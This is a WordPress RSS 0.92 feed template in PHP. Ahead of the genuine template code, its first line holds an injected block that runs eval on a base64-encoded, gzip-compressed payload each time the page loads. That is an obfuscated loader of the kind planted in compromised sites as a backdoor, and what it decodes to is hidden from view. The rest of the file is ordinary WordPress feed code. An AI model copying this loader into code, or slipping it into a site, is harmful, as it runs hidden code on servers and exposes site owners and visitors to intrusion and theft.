<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * RSS 0.92 Feed Template for displaying RSS 0.92 Posts feed.
 *
 * @package WordPress
 */

header('Content-Type: ' . feed_content_type('rss') . '; charset=' . get_option('blog_charset'), true);
$more = 1;

echo '<?xml version="1.0" encoding="'.get_option('blog_charset').'"?'.'>'; ?>
<rss version="0.92">
<channel>
	<title><?php wp_title_rss(); ?></title>
	<link><?php bloginfo_rss('url') ?></link>
	<description><?php bloginfo_rss('description') ?></description>
	<lastBuildDate><?php
		$date = get_lastpostmodified( 'GMT' );
		echo $date ? mysql2date( 'D, d M Y H:i:s +0000', $date ) : date( 'D, d M Y H:i:s +0000' );
	?></lastBuildDate>
	<docs>http://backend.userland.com/rss092</docs>
	<language><?php bloginfo_rss( 'language' ); ?></language>

	<?php
	/**
	 * Fires at the end of the RSS Feed Header.
	 *
	 * @since 2.0.0
	 */
	do_action( 'rss_head' );
	?>

<?php while (have_posts()) : the_post(); ?>
	<item>
		<title><?php the_title_rss() ?></title>
		<description><![CDATA[<?php the_excerpt_rss() ?>]]></description>
		<link><?php the_permalink_rss() ?></link>
		<?php
		/**
		 * Fires at the end of each RSS feed item.
		 *
		 * @since 2.0.0
		 */
		do_action( 'rss_item' );
		?>
	</item>
<?php endwhile; ?>
</channel>
</rss>
